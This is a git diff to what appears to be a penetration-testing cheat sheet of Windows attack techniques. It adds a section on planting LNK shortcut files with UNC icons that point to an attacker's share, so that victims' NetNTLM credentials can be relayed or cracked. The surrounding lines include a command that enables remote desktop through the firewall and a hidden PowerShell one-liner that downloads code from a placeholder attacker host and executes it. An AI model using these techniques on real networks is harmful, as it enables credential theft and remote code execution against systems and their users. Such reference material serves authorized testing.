@@ -39,6 +39,20 @@ When you modify a system to talk on the network, you may need to alter the Windo
 `netsh firewall set service type = remotedesktop mode = enable`
 
 
+### LNK (Shortcuts with UNC Icons #61
+If you are on an internal penetration test and either exploit a machine or find an open share, you can create an LNK file with an icon that points at a nonexistent share on your attacking machine's IP and use SMB_Relay to replay those credentials to a system in which we've identified by one means or another as an 'important' host to get on.
+
+Attacker uploads malicious LNK file to network share on FILE SHARE
+
+Victim views it on WORKSTATION that initiates an connection to ATTACKER
+
+Attacker relays those authentication attempts to FILE SHARE, gaining code execution if 'Victim' is an admin on FILE SHARE
+
+If not, then NetNTLM are still visible in the logs and can be attempted to crack, or just wait for more people to view the LNK file on the public share, and hope that an admin comes by at some point.
+
+Your mileage will vary based on where you put the LNK file.
+
+
 ### Powershell Downloader
  * **Command with arguments**: `powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))"`
  * **Description**: According to [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), _"Schedule this and it will execute the shellcode on that page, pulling it each time (so you can change as needed)"_. 
